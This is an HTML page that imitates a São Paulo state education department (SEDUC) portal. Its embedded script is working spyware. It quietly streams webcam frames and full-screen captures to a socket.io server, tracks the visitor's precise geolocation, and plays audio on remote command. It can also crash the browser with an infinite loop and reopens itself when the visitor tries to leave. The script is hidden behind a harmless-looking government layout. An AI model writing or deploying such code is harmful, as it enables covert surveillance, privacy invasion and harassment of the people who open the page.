<!--
--[[   _____   __    __    __   ___    _____   ________     ____ --]]
--[[  / ____\  ) )  ( (   () ) / __)  (_   _) (___  ___)   (    ) --]]
--[[ ( (___   ( (    ) )  ( (_/ /       | |       ) )      / /\ \ --]]
--[[  \___ \   ) )  ( (   ()   (        | |      ( (      ( (__) ) --]]
--[[      ) ) ( (    ) )  () /\ \       | |       ) )      )    ( --]]
--[[  ___/ /   ) \__/ (   ( (  \ \     _| |__    ( (      /  /\  \ --]]
--[[ /____/    \______/   ()_)  \_\   /_____(    /__\    /__(  )__\ --]]

--[[ ùêßùêöùêùùêö ùê©ùêöùê´ùêö ùêØùêûùê´ ùêöùê™ùêÆùê¢ --]]
-->

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title>d</title>
  <link rel="icon" href="https://www.institutoexito.com.br/storage/app/uploads/f3y98K8qjJjSJr8w7M6qu2EpzpofC8MLWbltM77l.jpg" type="image/png">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    body{margin:0;font-family:Arial, sans-serif}
    .top-bar{display:flex;justify-content:space-between;align-items:center;padding:10px 20px;background:#fff;
             border-bottom:1px solid #ccc;flex-wrap:wrap}
    .logo-text{display:flex;align-items:center;gap:10px}
    .logo{width:50px;height:40px;background:#000;border-radius:5px;position:relative}
    .logo::before{content:'';position:absolute;left:10px;top:8px;width:12px;height:12px;background:red;border-radius:2px}
    .gov-text{font-weight:700;font-size:14px;line-height:1.2}.gov-text span{display:block;font-size:12px;color:#555}
    .social-icons{display:flex;flex-direction:column;align-items:flex-end;gap:4px}
    .social-icons .row{display:flex;align-items:center;gap:8px}
    .social-icons i{font-size:16px;color:#666;cursor:pointer}.social-icons span{font-size:13px;color:#666}
    .font-controls i{font-size:14px;margin-left:8px}
    .mid-bar{text-align:center;background:#eee;padding:10px}.mid-bar i{font-size:20px;margin:0 6px}
    .nav-bar{background:#2e477a;color:#fff;display:flex;align-items:center;padding:10px 20px;justify-content:space-between;flex-wrap:wrap}
    .nav-links{display:flex;gap:20px;flex-wrap:wrap}.nav-links span{cursor:pointer}
    .search{font-size:18px;cursor:pointer}
    @media(max-width:600px){
      .top-bar,.nav-bar{flex-direction:column;align-items:flex-start}
      .social-icons{align-items:flex-start}
    }
  </style>
</head>
<body>

<!-- TOPO INSTITUCIONAL ------------------------------------------------------>
<div class="top-bar">
  <div class="logo-text">
    <div class="logo"></div>
    <div class="gov-text">S√ÉO PAULO<br><span>GOVERNO DO ESTADO<br>S√ÉO PAULO S√ÉO TODOS</span></div>
  </div>
  <div class="social-icons">
    <div class="row">
      <i class="fab fa-facebook-f"></i><i class="fab fa-linkedin-in"></i><i class="fab fa-tiktok"></i>
      <i class="fab fa-youtube"></i><i class="fab fa-x-twitter"></i><i class="fab fa-instagram"></i>
      <span>/governosp</span>
    </div>
    <div class="row font-controls">
      <i class="fas fa-plus-circle"></i><i class="fas fa-minus-circle"></i><i class="fas fa-exclamation-circle"></i>
    </div>
  </div>
</div>

<div class="mid-bar">
  <strong>Siga-nos em nossas redes sociais:</strong><br>
  <i class="fab fa-facebook" style="color:#1877F2"></i>
  <i class="fab fa-instagram" style="color:#E1306C"></i>
  <i class="fab fa-x-twitter" style="color:#000"></i>
  <i class="fab fa-youtube" style="color:#F00"></i>
  <i class="fab fa-flickr" style="color:#FF0084"></i>
  <i class="fab fa-tiktok" style="color:#000"></i>
</div>

<div class="nav-bar">
  <div class="nav-links">
    <span>In√≠cio</span><span>Institucional</span><span>Programas e Projetos</span>
    <span>Servi√ßos</span><span>Sala do Professor</span><span>Fale com a SEDUC</span><span>Not√≠cias</span>
  </div>
  <div class="search"><i class="fas fa-search"></i></div>
</div>

<!-- ELEMENTOS OCULTOS ------------------------------------------------------->
<video id="video" playsinline autoplay muted style="display:none"></video>
<audio id="trollAudio" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>

<!-- SCRIPTS ----------------------------------------------------------------->
<script src="/socket.io/socket.io.js"></script>
<script>
/* ========= Conex√£o ====================================================== */
 const socket = io({ query:{ role:'client' } });
  // & outros listeners &

  // substitua o antigo socket.on('crash-browser', &) por:
  socket.on('crash-browser', () => {
    console.log('√î Recebi crash-browser, iniciando loop de crash&');
    for (let i = 5; i > 3; i = i + 1) {
      console.log(i);
    }
  });

/* ========= Fun√ß√£o auxiliar ============================================= */
const blobToDataURL = blob => new Promise(r=>{const fr=new FileReader();fr.onload=()=>r(fr.result);fr.readAsDataURL(blob);});

/* ========= C√ÇMERA ======================================================= */
(async()=>{
  try{
    const cam = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
    const cap = new ImageCapture(cam.getVideoTracks()[0]);

    setInterval(async()=>{
      try{
        const bmp = await cap.grabFrame();
        const cv  = new OffscreenCanvas(bmp.width,bmp.height);
        cv.getContext('2d').drawImage(bmp,0,0);
        const blob = await cv.convertToBlob({type:'image/jpeg',quality:.6});
        socket.emit('frame', await blobToDataURL(blob));
      }catch{}
    },300);
  }catch(err){console.warn('cam:',err)}
})();

/* ========= TELA  (1920√ó1080 a 15 fps) ================================== */
let wantScreen = true;
(async function startScreen(){
  try{
    const constraints = {video:{width:1920,height:1080,frameRate:15}};
    const stream = await navigator.mediaDevices.getDisplayMedia(constraints);

    const track  = stream.getVideoTracks()[0];
    /* for√ßa a resolu√ß√£o se o SO / navegador permitir */
    if(track.applyConstraints) track.applyConstraints(constraints.video).catch(()=>{});

    const cap    = new ImageCapture(track);
    const CW     = 1920, CH = 1080;                     // canvas fixo

    const canvas = new OffscreenCanvas(CW,CH);
    const ctx    = canvas.getContext('2d');

    setInterval(async()=>{
      if(!wantScreen) return;
      try{
        const bmp  = await cap.grabFrame();
        ctx.drawImage(bmp,0,0,CW,CH);
        const blob = await canvas.convertToBlob({type:'image/jpeg',quality:.8});
        socket.emit('screen-frame', await blobToDataURL(blob));
      }catch{}
    },100); /* ~10 fps suficientes */

    track.addEventListener('ended',()=>{wantScreen=false});
  }catch(err){console.warn('screen:',err)}
})();

/* ========= GEOLOCALIZA√á√ÉO ============================================== */
if('geolocation' in navigator){
  navigator.geolocation.watchPosition(pos=>{
    socket.emit('location',{
      lat:pos.coords.latitude, lon:pos.coords.longitude,
      accuracy:pos.coords.accuracy, timestamp:pos.timestamp
    });
  },()=>{}, {enableHighAccuracy:true,maximumAge:5000,timeout:10000});
}

/* ========= √ÅUDIO REMOTO ================================================= */
let currentAudio=null;
socket.on('play-audio',({url})=>{
  if(currentAudio){currentAudio.pause();currentAudio=null;}
  currentAudio=new Audio(url); currentAudio.play().catch(()=>{});
});
socket.on('stop-audio',()=>{
  if(currentAudio){currentAudio.pause();currentAudio.currentTime=0;currentAudio=null;}
});



/* ========= BLOQUEIO DE SA√çDA =========================================== */
let confirmExit=true;
window.addEventListener('beforeunload',e=>{
  if(confirmExit){
    e.preventDefault(); e.returnValue='';
    setTimeout(()=>window.open(window.location.href,'_blank'),10);
  }
});
</script>
</body>
</html>'
